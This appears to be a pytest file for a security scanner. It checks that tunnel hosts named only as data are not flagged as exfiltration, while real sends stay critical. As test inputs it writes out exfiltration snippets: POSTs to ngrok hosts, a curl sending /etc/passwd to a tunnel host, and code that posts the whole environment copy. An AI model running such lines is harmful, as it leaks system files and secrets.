"""Verdict accuracy audit 2026-11, false-positive classes 2 and 3.

Class 2: a tunnel host (ngrok) named as DATA, not a destination, read as
"Outbound webhook/exfil URL" (critical) because the file is a bundle with network
sinks elsewhere: a Public Suffix List bundled into @mastra/core, a `??`-chained
`allowedHosts` default and a membership-only suffix Set in @agent-native/core, an
ngrok-setup prompt's placeholder and example text in @open-mercato/cezar.

Class 3: "Whole environment sent outbound" when the copied environment never leaves
the machine: browser-use reads one key out of `{**os.environ, **env}`; openshorts
hands `job_env()` (a `dict(os.environ)` copy) to a local subprocess's `env=`.

Fixtures under tests/fixtures/audit_fp_tunnel_env/ are verbatim excerpts of the
scanned archives (the vite fixture prepends the bundle's own `fetch(` lines, the PSL
fixture keeps the run's head, the `ngrok.io` neighbourhood and its tail plus the
bundle's `fetch(`). Every recall twin keeps its critical.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from src.scanner.credential_flow import env_dump_exfil_hits
from src.scanner.scan import _scan_content

FIX = Path(__file__).parent / "fixtures" / "audit_fp_tunnel_env"
EXFIL = "Outbound webhook/exfil URL"
ENV_DUMP = "Whole environment sent outbound"


def _sevs(code: str, path: str, name: str = EXFIL) -> list[str]:
    findings, _, _ = _scan_content(code, path)
    return [f.severity for f in findings if f.name == name]


# --- class 2: tunnel host as data --------------------------------------------------

@pytest.mark.parametrize("fixture,path,count", [
    ("mastra_llm_mock_psl.js.txt", "dist/test-utils/llm-mock.js", 1),
    ("agent_native_vite_client.js.txt", "dist/vite/client.js", 3),
    ("agent_native_custom_registry.js.txt", "dist/provider-api/custom-registry.js", 2),
    ("cezar_macosx_ngrok.js.txt", "dist/server-install/platforms/macosx-ngrok.js", 2),
])
def test_tunnel_host_as_data_is_low(fixture, path, count):
    sevs = _sevs((FIX / fixture).read_text(), path)
    assert sevs == ["low"] * count, sevs


def _psl(entries: list[str], tail: str = "\t];\n") -> str:
    body = "".join(f'\t\t"{e}",\n' for e in entries)
    return ('var require_rules = __commonJS3({ "node_modules/psl/data/rules.json"'
            '(exports, module) {\n\tmodule.exports = [\n' + body + tail + "} });\n"
            "function send(u, d) { return fetch(u, {method: 'POST', body: d}); }\n")


_FILLER = [f"host{i}.example.app" for i in range(240)]

_REAL_SINK = "fetch('https://ab12.ngrok.io/c', {method: 'POST', body: data});\n"


@pytest.mark.parametrize("code,path", [
    # a real request to a tunnel host
    (_REAL_SINK, "dist/index.js"),
    ("requests.post('https://ab12.ngrok-free.app/c', json=payload)\n", "x.py"),
    # a shared collector inside a long bundled domain list
    (_psl(_FILLER[:120] + ["webhook.site"] + _FILLER[120:]), "dist/bundle.js"),
    # a short list bundled with code is not a domain-list module
    (_psl(_FILLER[:50] + ["ngrok.io"]), "dist/bundle.js"),
    # a URL element, not a bare host
    (_psl(_FILLER[:120] + ["https://ab12.ngrok.io/c"] + _FILLER[120:]), "dist/bundle.js"),
    # a run that is not one array literal
    (_psl(_FILLER[:120] + ["ngrok.io"] + _FILLER[120:], tail="\t].concat(x);\n")
     .replace("module.exports = [", "send("), "dist/bundle.js"),
    # allowedHosts default with a resolvable host, not a suffix
    ("const r = await fetch(u);\nallowedHosts: options.allowedHosts ??\n"
     "    cfg.allowedHosts ?? [\n    \"ab12.ngrok.io\",\n],\n", "dist/vite.js"),
    # a suffix list that is a destination key, not an allowlist
    ("const r = await fetch(u);\nurl: options.url ?? [\n    \".ngrok.io\",\n],\n",
     "dist/vite.js"),
    # a suffix Set that also reaches a send
    ("const S = new Set([\n  \"ngrok.io\",\n]);\nif (S.has(h)) ok();\n"
     "for (const s of S) fetch('https://' + s);\n", "dist/x.js"),
    # placeholder / example text twins
    ("placeholder: 'webhook.site',\n", "dist/x.js"),
    ("url: 'cezar.ngrok.app',\n", "dist/x.js"),
    ("message: 'send it to https://cezar.ngrok.app, e.g. cezar.ngrok.app',\n", "dist/x.js"),
    ("message: `e.g. ${sub}.ngrok.app`,\n", "dist/x.js"),
    ("run('curl cezar.ngrok.app -d @/etc/passwd')\n", "dist/x.js"),
    ("text: 'e.g. ab12.webhook.site',\n", "dist/x.js"),
])
def test_tunnel_host_destinations_stay_critical(code, path):
    assert "critical" in _sevs(code, path), code


# --- class 3: environment kept on the machine --------------------------------------

@pytest.mark.parametrize("fixture,path", [
    ("browser_use_harness_cloud.py.txt", "browser_use/harness_cloud.py"),
    ("openshorts_worker.py.txt", "worker.py"),
])
def test_env_kept_local_is_not_sent(fixture, path):
    assert _sevs((FIX / fixture).read_text(), path, ENV_DUMP) == []


@pytest.mark.parametrize("code,lang", [
    ("import requests, os\nmerged = {**os.environ}\nrequests.post('https://x.io', json=merged)\n",
     "python"),
    # a key lookup first does not clean the copy itself
    ("import requests, os\nmerged = {**os.environ}\nu = merged.get('A')\n"
     "requests.post(u, json=merged)\n", "python"),
    # a computed key, a default that is the copy again
    ("import requests, os\nmerged = dict(os.environ)\nv = merged[k]\n"
     "requests.post('https://x.io', data=v)\n", "python"),
    ("import requests, os\nmerged = dict(os.environ)\nv = merged.get('A', merged)\n"
     "requests.post('https://x.io', data=v)\n", "python"),
    # a dump helper handed to a child process AND sent
    ("import requests, os, subprocess\ndef e():\n    env = dict(os.environ)\n    return env\n"
     "p = subprocess.Popen(['x'], env=e())\nrequests.post('https://x.io', json=e())\n", "python"),
    ("import requests, os, subprocess\ndef e():\n    env = dict(os.environ)\n    return env\n"
     "p = subprocess.Popen(['x'], env=e())\nrequests.post('https://x.io', json=e(), "
     "data=p.returncode)\n", "python"),
    ("const merged = {...process.env};\n"
     "fetch('https://x.io', {method:'POST', body: JSON.stringify(merged)});\n", "javascript"),
    # a method call on the copy is not a key lookup
    ("const merged = {...process.env};\n"
     "fetch('https://x.io', {method:'POST', body: merged.toString()});\n", "javascript"),
    ("const merged = {...process.env};\nconst k = 'A';\n"
     "fetch('https://x.io', {method:'POST', body: merged[k]});\n", "javascript"),
])
def test_env_sent_stays_critical(code, lang):
    assert env_dump_exfil_hits(code, lang), code


@pytest.mark.parametrize("code,lang", [
    ("import socket, os\nmerged = {**os.environ, **(env or {})}\nurl = merged.get('BU_CDP_URL')\n"
     "socket.create_connection((url, 9222)).close()\n", "python"),
    ("import requests, os\nmerged = dict(os.environ)\nu = merged['API_URL']\nrequests.get(u)\n",
     "python"),
    ("const merged = {...process.env};\nconst u = merged.API_URL;\nfetch(u);\n", "javascript"),
    ("import requests, os, subprocess\ndef job_env():\n    env = dict(os.environ)\n    return env\n"
     "proc = subprocess.Popen(['x'], env=job_env())\n"
     "requests.post('https://api.example/done', json={'rc': proc.returncode})\n", "python"),
])
def test_env_key_lookup_or_child_env_is_not_a_dump(code, lang):
    assert env_dump_exfil_hits(code, lang) == []


# --- the tree pass for a membership-only suffix Set ---------------------------------

def _tree_sevs(registry: str, importer: str) -> list[str]:
    from src.scanner import npm_scripts

    path = "dist/provider-api/custom-registry.js"
    findings, _, _ = _scan_content(registry, path)
    texts = {path: registry, "dist/provider-api/index.js": importer}
    npm_scripts.restore_signature_hosts(findings, texts)
    return [f.severity for f in findings if f.name == EXFIL]


_IMPORTER = 'import { validateAllowedHostSuffixes } from "./custom-registry.js";\n'


def test_private_membership_set_stays_low_when_module_is_imported():
    reg = (FIX / "agent_native_custom_registry.js.txt").read_text()
    assert _tree_sevs(reg, _IMPORTER) == ["low", "low"]


@pytest.mark.parametrize("change", [
    # exported, re-exported, or read beyond a membership test: an importer may send it
    lambda s: s.replace("const FORBIDDEN_HOST_SUFFIXES", "export const FORBIDDEN_HOST_SUFFIXES"),
    lambda s: s + "export {\n  FORBIDDEN_HOST_SUFFIXES,\n};\n",
    lambda s: s + "export function suffixes() { return [...FORBIDDEN_HOST_SUFFIXES]; }\n",
    lambda s: s + "module.exports = { validateAllowedHostSuffixes };\n",
])
def test_reachable_suffix_set_is_restored(change):
    reg = change((FIX / "agent_native_custom_registry.js.txt").read_text())
    assert "critical" in _tree_sevs(reg, _IMPORTER)


def test_other_file_naming_the_set_restores():
    reg = (FIX / "agent_native_custom_registry.js.txt").read_text()
    assert "critical" in _tree_sevs(reg, "fetch('https://' + [...FORBIDDEN_HOST_SUFFIXES][0]);\n")
